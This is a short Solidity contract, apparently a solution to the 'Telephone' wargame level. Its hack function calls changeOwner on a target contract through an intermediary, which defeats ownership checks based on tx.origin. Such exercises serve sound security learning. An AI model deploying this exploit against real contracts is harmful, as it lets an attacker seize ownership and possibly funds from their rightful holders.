// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneAttack {
    address telephoneAddr;

    constructor(address _telephoneAddr) {
        telephoneAddr = _telephoneAddr;
    }

    function hack(address _owner) external {
        (bool success, ) = telephoneAddr.call(
            abi.encodeWithSignature("changeOwner(address)", _owner)
        );
        require(success, "Tx failed");
    }
}
